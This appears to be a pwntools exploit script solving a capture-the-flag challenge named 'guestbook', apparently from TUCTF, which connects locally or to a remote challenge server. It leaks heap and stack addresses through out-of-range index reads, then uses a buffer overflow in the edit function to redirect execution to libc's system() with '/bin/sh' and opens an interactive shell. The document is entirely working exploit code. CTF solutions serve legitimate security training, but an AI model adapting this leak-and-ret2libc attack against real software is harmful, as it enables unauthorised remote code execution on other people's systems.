from pwn import *
import sys, time

#context.binary = "./guestbook"
binary = ELF("./guestbook")
libc = ELF("./libc.so.6")

if len(sys.argv) == 1:
    p = process(["./guestbook"], env={"LD_PRELOAD":"./libc.so.6"})
    pause()

else:
    p = remote("guestbook.tuctf.com", "4545")

def set_chunk(data):
    p.recvuntil(">>>")
    if len(data) == 15:
        p.send(data)
    else:
        p.sendline(data)

def view(idx):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil("view?\n>>>")
    p.sendline(str(idx))


def edit(idx, data):
    p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil("change?\n>>>")
    p.sendline(str(idx))
    p.recvuntil("guest.\n>>>")
    p.sendline(data)

for i in xrange(4):
    set_chunk(chr(ord("A") + i) * 8)

binsh = 0x15f551
system_offset = 0x3e3e0

view(6)
heap_base = u32(p.recv(4)) - 8
log.info("heap_base : " + hex(heap_base))

p.sendline("")
view(20)
stack = u32(p.recv(4)) - 0x19970
log.info("stack : " + hex(stack))
system = stack + system_offset
sh = stack + binsh
exp = "\x00" * 108 + p32(heap_base + 8)  + p32(stack) * 3
exp += "B" * (0x98 - len(exp)) + p32(0xdeadbeef) + p32(system) + p32(0xcafecafe) + p32(sh)
edit(0, exp)


p.interactive()
